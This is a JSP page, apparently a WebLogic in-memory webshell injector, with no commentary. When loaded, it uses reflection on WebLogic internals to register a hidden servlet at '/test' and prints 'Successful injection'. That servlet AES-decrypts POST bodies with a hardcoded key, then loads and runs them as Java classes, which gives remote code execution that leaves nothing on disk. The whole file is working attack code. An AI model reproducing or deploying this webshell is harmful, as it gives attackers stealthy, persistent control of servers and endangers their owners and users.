<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.IOException" %>
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
<%@page import="java.security.NoSuchAlgorithmException"%>
<%@page import="javax.crypto.Cipher"%>


<%@page import="java.security.InvalidKeyException"%>
<%@page import="java.security.NoSuchAlgorithmException"%>
<%@ page import="weblogic.servlet.internal.WebAppServletContext" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="weblogic.servlet.internal.ServletStubImpl" %>


<html>
<head>
    <title>servletContext</title>
</head>
<body>
<%!class U extends ClassLoader{
    U(ClassLoader c){
        super(c);
    }
    public Class g(byte []b){
        return super.defineClass(b,0,b.length);
    }
}%>
<%
    class WeblogicServlet extends HttpServlet {

        @Override
        public void init() throws ServletException {
        }


        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

        }

        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            String k = "e45e329feb5d925b";
            HttpSession session = req.getSession();
            session.setAttribute("u", k);
            Cipher c = null;
            try {
                c = Cipher.getInstance("AES");
            } catch (NoSuchAlgorithmException e) {
                e.printStackTrace();
            } catch (NoSuchPaddingException e) {
                e.printStackTrace();
            }
            try {
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
            } catch (InvalidKeyException e) {
                e.printStackTrace();
            }
            javax.servlet.jsp.PageContext pageContext = javax.servlet.jsp.JspFactory.getDefaultFactory().getPageContext(this, req, resp, null, true, 8192, true);
            try {
                new U(this.getClass().getClassLoader()).g(
                        c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(req.getReader().readLine()))).newInstance().equals(pageContext);
            } catch (InstantiationException e) {
                e.printStackTrace();
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            } catch (IllegalBlockSizeException e) {
                e.printStackTrace();
            } catch (BadPaddingException e) {
                e.printStackTrace();
            }
        }


        @Override
        public void destroy() {
            super.destroy();
        }

    }
%>

<%
    String path = "/test";
    WebAppServletContext webAppServletContext = (WebAppServletContext)request.getServletContext();
    Method getServletMapping = webAppServletContext.getClass().getDeclaredMethod("getServletMapping");
    getServletMapping.setAccessible(true);
    Object servletMapping = getServletMapping.invoke(webAppServletContext);
    Method put = servletMapping.getClass().getDeclaredMethod("put", String.class, Object.class);
    WeblogicServlet weblogicServlet = new WeblogicServlet();

    Constructor<?> ServletStubImplConstructor = Class.forName("weblogic.servlet.internal.ServletStubImpl").getDeclaredConstructor(String.class, Servlet.class, WebAppServletContext.class);
    ServletStubImplConstructor.setAccessible(true);
    ServletStubImpl servletStub = (ServletStubImpl) ServletStubImplConstructor.newInstance(path, weblogicServlet, webAppServletContext);

    Constructor<?> URLMatchHelperConstructor = Class.forName("weblogic.servlet.internal.URLMatchHelper").getDeclaredConstructor(String.class, ServletStubImpl.class);
    URLMatchHelperConstructor.setAccessible(true);
    Object umh = URLMatchHelperConstructor.newInstance(path, servletStub);

    put.invoke(servletMapping, path, umh);
    out.write("Successful injection ");
%>
</body>
</html>